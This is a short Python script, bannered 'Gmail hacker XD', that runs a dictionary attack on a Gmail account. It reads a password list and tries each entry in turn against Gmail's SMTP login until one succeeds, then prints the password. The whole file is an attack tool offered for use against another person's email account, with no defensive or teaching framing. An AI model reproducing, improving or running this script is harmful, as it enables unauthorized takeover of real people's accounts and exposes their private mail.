# Coded by: Sp1derman hacker
# Github: https://github.com/sp1dermanhackeryoutube
# YouTube: https://www.youtube.com/channel/UCwL-qGwm5ncO6IfB83x35BA

import smtplib

print(" _____                 _ _   _                _                    _____  ")
print(" / ____|               (_) | | |              | |                  |  __ \ ")
print("| |  __ _ __ ___   __ _ _| | | |__   __ _  ___| | _____ _ __  __  _| |  | |")
print("| | |_ | '_ ` _ \ / _` | | | | '_ \ / _` |/ __| |/ / _ \ '__| \ \/ / |  | |")
print("| |__| | | | | | | (_| | | | | | | | (_| | (__|   <  __/ |     >  <| |__| |")
print(" \_____|_| |_| |_|\__,_|_|_| |_| |_|\__,_|\___|_|\_\___|_|    /_/\_\_____/ ")
print("")
print("")
file = input("Path of the password list: ")
passfile = open(file, 'r')
passfilet = passfile.readlines()

Gmail = input("Gmail to hack: ")
server = smtplib.SMTP("smtp.gmail.com",587)
server.ehlo()
server.starttls()
for password in passfilet:
    try:
        server.login(Gmail, password)
        print("SUCCESS")
        print("Password is: " + password)
        break

    except smtplib.SMTPAuthenticationError:
     print("Password tried " + password)
input("")
